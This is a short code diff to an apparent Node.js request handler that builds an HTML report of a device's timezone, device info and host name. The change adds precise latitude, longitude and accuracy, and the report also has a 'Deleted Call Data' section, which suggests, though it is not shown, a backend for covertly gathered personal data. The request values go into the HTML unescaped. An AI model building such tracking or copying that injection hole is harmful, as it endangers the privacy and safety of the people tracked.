@@ -15,7 +15,8 @@ module.exports = async (req, res) => {
     timezone = 'unknown',
     localTime = new Date().toLocaleString(),
     deviceInfo = 'unknown',
-    hostName = 'Unknown'
+    hostName = 'Unknown',
+    preciseLocation = null
   } = req.body;
 
   const html = `
@@ -29,6 +30,15 @@ module.exports = async (req, res) => {
       <p><strong>Timezone:</strong> ${timezone}</p>
       <p><strong>Local Time:</strong> ${localTime}</p>
       <p><strong>Device Info:</strong> ${deviceInfo}</p>
+      ${
+        preciseLocation
+          ? `
+        <p><strong>Latitude:</strong> ${preciseLocation.latitude}</p>
+        <p><strong>Longitude:</strong> ${preciseLocation.longitude}</p>
+        <p><strong>Accuracy:</strong> ±${preciseLocation.accuracy} meters</p>
+      `
+          : '<p><strong>Precise Location:</strong> Not shared</p>'
+      }
       <hr />
       <h3>Deleted Call Data</h3>
       <pre style="background: #f4f4f4; padding: 10px; border-radius: 6px;">
